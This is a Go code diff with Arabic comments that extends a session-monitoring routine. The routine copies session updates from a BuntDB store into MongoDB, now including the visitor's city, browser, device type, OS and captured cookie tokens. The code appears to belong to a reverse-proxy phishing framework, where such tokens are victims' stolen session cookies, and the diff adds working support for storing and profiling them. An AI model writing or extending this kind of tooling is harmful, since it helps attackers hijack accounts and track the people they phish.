@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
+	"reflect"
 	"regexp"
 	"time"
 
@@ -529,7 +530,7 @@ func monitorSessionUpdates(buntDb *database.Database, mongoDb database.IDatabase
 				}
 			}
 			
-			// إضافة جديدة: التحقق من تحديث معلومات البلد
+			// التحقق من تحديث معلومات البلد
 			countryCodeChanged := current.CountryCode != previous.CountryCode && current.CountryCode != ""
 			countryChanged := current.Country != previous.Country && current.Country != ""
 			
@@ -560,6 +561,100 @@ func monitorSessionUpdates(buntDb *database.Database, mongoDb database.IDatabase
 						} else {
 							log.Success("تم تحديث معلومات البلد في MongoDB: %s/%s", current.CountryCode, current.Country)
 						}
+					}
+				}
+			}
+
+			// إضافة جديدة: التحقق من تحديث معلومات المدينة
+			cityChanged := current.City != previous.City && current.City != ""
+			if cityChanged {
+				log.Debug("تم اكتشاف تحديث معلومات المدينة: %s -> %s", 
+					previous.City, current.City)
+
+				// تحقق من وجود القيم في MongoDB قبل التحديث
+				mongoSession, err := mongoDb.GetSessionBySid(current.SessionId)
+				if err != nil {
+					log.Error("فشل استرداد الجلسة من MongoDB: %v", err)
+				} else {
+					// إذا كانت MongoDB لديها معلومات المدينة، تحقق إذا كانت فارغة
+					hasMongoCity := mongoSession.City != ""
+					
+					if hasMongoCity && current.City == "" {
+						log.Debug("تم تجاهل تحديث المدينة لأن MongoDB تحتوي بالفعل على معلومات: %s", mongoSession.City)
+					} else if current.City != "" {
+						// تحديث معلومات المدينة
+						err = mongoDb.SetSessionCityInfo(current.SessionId, current.City)
+						if err != nil {
+							log.Error("فشل تحديث معلومات المدينة في MongoDB: %v", err)
+						} else {
+							log.Success("تم تحديث معلومات المدينة في MongoDB: %s", current.City)
+						}
+					}
+				}
+			}
+			
+			// إضافة جديدة: التحقق من تحديث معلومات المتصفح والجهاز ونظام التشغيل
+			browserChanged := current.Browser != previous.Browser && current.Browser != ""
+			deviceTypeChanged := current.DeviceType != previous.DeviceType && current.DeviceType != ""
+			osChanged := current.OS != previous.OS && current.OS != ""
+			
+			if browserChanged || deviceTypeChanged || osChanged {
+				log.Debug("تم اكتشاف تحديث معلومات المتصفح/الجهاز: المتصفح: %s -> %s, الجهاز: %s -> %s, نظام التشغيل: %s -> %s",
+					previous.Browser, current.Browser,
+					previous.DeviceType, current.DeviceType,
+					previous.OS, current.OS)
+					
+				// تحقق من وجود القيم في MongoDB أولاً
+				mongoSession, err := mongoDb.GetSessionBySid(current.SessionId)
+				if err != nil {
+					log.Error("فشل استرداد الجلسة من MongoDB: %v", err)
+				} else {
+					// تحقق إذا كانت MongoDB تحتوي بالفعل على معلومات المتصفح والجهاز
+					hasMongoInfo := mongoSession.Browser != "" || mongoSession.DeviceType != "" || mongoSession.OS != ""
+					
+					// استخدم القيم الحالية إذا كانت متوفرة، أو استخدم قيم MongoDB
+					updatedBrowser := current.Browser
+					if updatedBrowser == "" {
+						updatedBrowser = mongoSession.Browser
+					}
+					
+					updatedDeviceType := current.DeviceType
+					if updatedDeviceType == "" {
+						updatedDeviceType = mongoSession.DeviceType
+					}
+					
+					updatedOS := current.OS
+					if updatedOS == "" {
+						updatedOS = mongoSession.OS
+					}
+					
+					// تحديث المعلومات فقط إذا كان هناك أي معلومات جديدة
+					if updatedBrowser != "" || updatedDeviceType != "" || updatedOS != "" {
+						err = mongoDb.SetSessionBrowserInfo(current.SessionId, updatedBrowser, updatedDeviceType, updatedOS)
+						if err != nil {
+							log.Error("فشل تحديث معلومات المتصفح/الجهاز في MongoDB: %v", err)
+						} else {
+							log.Success("تم تحديث معلومات المتصفح/الجهاز في MongoDB: المتصفح=%s، الجهاز=%s، نظام التشغيل=%s", 
+								updatedBrowser, updatedDeviceType, updatedOS)
+						}
+					} else if !hasMongoInfo {
+						log.Debug("تم تجاهل تحديث معلومات المتصفح/الجهاز لأن لا توجد بيانات جديدة")
+					}
+				}
+			}
+			
+			// مزامنة رموز الكوكيز
+			if len(current.CookieTokens) != len(previous.CookieTokens) || 
+			   !reflect.DeepEqual(current.CookieTokens, previous.CookieTokens) {
+				log.Debug("تم اكتشاف تحديث في رموز الكوكيز")
+				
+				// تحقق إذا كانت هناك رموز كوكي جديدة للمزامنة
+				if len(current.CookieTokens) > 0 {
+					err = mongoDb.SetSessionCookieTokens(current.SessionId, current.CookieTokens)
+					if err != nil {
+						log.Error("فشل تحديث رموز الكوكيز في MongoDB: %v", err)
+					} else {
+						log.Success("تم تحديث %d من رموز الكوكيز في MongoDB", len(current.CookieTokens))
 					}
 				}
 			}
